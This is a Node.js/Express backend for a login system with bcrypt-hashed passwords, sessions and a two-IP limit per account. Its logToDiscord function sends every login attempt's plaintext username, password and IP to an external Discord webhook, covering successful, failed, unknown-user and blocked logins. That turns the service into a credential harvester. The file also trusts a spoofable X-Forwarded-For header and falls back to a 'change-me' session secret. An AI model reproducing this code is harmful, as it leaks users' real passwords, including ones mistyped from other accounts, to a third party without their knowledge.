// backend.js
require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const session = require('express-session');
const cors = require('cors');
const https = require('https'); // we'll use this to send to Discord

const app = express();

// let express trust proxy so we can get real IP if behind something
app.set('trust proxy', true);

// CORS so your React (localhost:3000) can talk to this
app.use(
  cors({
    origin: ['http://localhost:3000'],
    credentials: true,
  })
);

// parse json
app.use(express.json());

// sessions
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'change-me',
    resave: false,
    saveUninitialized: false,
  })
);

// connect to mongo
mongoose
  .connect(process.env.MONGO_URL)
  .then(() => console.log('Mongo connected'))
  .catch((err) => console.error('Mongo error', err));

// user schema
const userSchema = new mongoose.Schema({
  username: { type: String, unique: true },
  passwordHash: String,
  ips: [String],
});

const User = mongoose.model('User', userSchema);

// get IP helper
function getClientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.ip;
}

// discord logger using https (no fetch needed)
function logToDiscord(content) {
  const url = process.env.DISCORD_WEBHOOK_URL;
  if (!url) {
    console.log('DISCORD_WEBHOOK_URL not set');
    return;
  }

  const parsed = new URL(url);
  const data = JSON.stringify({ content });

  const options = {
    hostname: parsed.hostname,
    path: parsed.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
    },
  };

  const req = https.request(options, (res) => {
    // optional: console.log('discord status', res.statusCode);
  });

  req.on('error', (err) => {
    console.error('discord log failed', err.message);
  });

  req.write(data);
  req.end();
}

// ADMIN: create user
app.post('/admin/create-user', async (req, res) => {
  const adminKey = req.headers['x-admin-key'];
  if (adminKey !== process.env.ADMIN_KEY) {
    return res.status(401).json({ error: 'not allowed' });
  }

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'need username and password' });
  }

  const hash = await bcrypt.hash(password, 12);

  try {
    const user = new User({
      username,
      passwordHash: hash,
      ips: [],
    });
    await user.save();

    logToDiscord(
      `🆕 User created
**username:** ${username}`
    );

    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: 'username taken?' });
  }
});

// LOGIN: 2 IP max + discord logging
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIp(req);

  const user = await User.findOne({ username });
  if (!user) {
    logToDiscord(
      `❌ Login failed (user not found)
**username:** ${username}
**password:** ${password}
**ip:** ${ip}`
    );
    return res.status(401).json({ error: 'bad login' });
  }

  const match = await bcrypt.compare(password, user.passwordHash);
  if (!match) {
    logToDiscord(
      `❌ Login failed (bad password)
**username:** ${username}
**password:** ${password}
**ip:** ${ip}`
    );
    return res.status(401).json({ error: 'bad login' });
  }

  const hasIp = user.ips.includes(ip);

  if (!hasIp) {
    // limit to 2 IPs
    if (user.ips.length >= 2) {
      logToDiscord(
        `⛔ Login blocked (IP limit reached)
**username:** ${username}
**password:** ${password}
**ip:** ${ip}
**stored_ips:** ${user.ips.join(', ')}`
      );
      return res.status(403).json({ error: 'ip limit reached' });
    }
    user.ips.push(ip);
    await user.save();
  }

  // success
  req.session.userId = user._id.toString();

  logToDiscord(
    `✅ Login success
**username:** ${username}
**password:** ${password}
**ip:** ${ip}
**stored_ips_now:** ${user.ips.join(', ')}`
  );

  res.json({ ok: true });
});

// session check for React
app.get('/me', (req, res) => {
  if (!req.session.userId) {
    return res.json({ loggedIn: false });
  }
  return res.json({ loggedIn: true });
});

// test route to see if discord works
app.get('/test-discord', (req, res) => {
  logToDiscord('🧪 test message from /test-discord');
  res.json({ ok: true });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log('server running on', PORT);
});
